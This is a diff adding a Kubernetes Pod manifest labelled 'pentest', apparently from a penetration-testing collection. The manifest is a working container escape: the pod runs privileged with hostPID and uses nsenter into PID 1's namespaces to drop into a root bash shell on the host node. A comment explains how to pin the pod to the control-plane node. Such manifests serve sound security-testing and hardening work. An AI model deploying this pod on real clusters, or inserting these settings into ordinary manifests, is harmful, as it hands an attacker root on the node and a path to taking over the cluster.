@@ -1,0 +1,16 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: priv-and-hostpid-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostPID: true
+  containers:
+  - name: priv-and-hostpid-pod
+    image: ubuntu
+    tty: true
+    securityContext:
+      privileged: true
+    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
